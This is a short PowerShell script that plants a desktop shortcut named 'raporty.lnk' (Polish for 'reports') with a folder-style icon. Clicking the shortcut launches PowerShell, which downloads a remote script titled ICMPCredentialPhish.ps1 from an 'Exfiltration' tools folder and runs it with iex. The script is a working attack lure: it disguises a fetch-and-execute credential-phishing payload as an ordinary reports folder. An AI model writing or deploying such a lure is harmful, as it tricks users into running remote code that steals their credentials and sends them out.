$w = New-Object -ComObject WScript.Shell
$desktop = [system.environment]::GetFolderPath("Desktop")
$link = $w.CreateShortcut("$desktop\raporty.lnk")
$link.TargetPath = 'powershell.exe'
$link.arguments =
' -c "$r=((iwr https://raw.githubusercontent.com/TomasBombadil/TOOLS/master/Exfiltration/ICMPCredentialPhish.ps1).Content);-join $r[1..$($r.Length-1)] | iex; Read-Host "  '
$link.workingDirectory = 'c:\'
$link.IconLocation = "C:\Windows\System32\Shell32.dll,3"
$link.save() > $null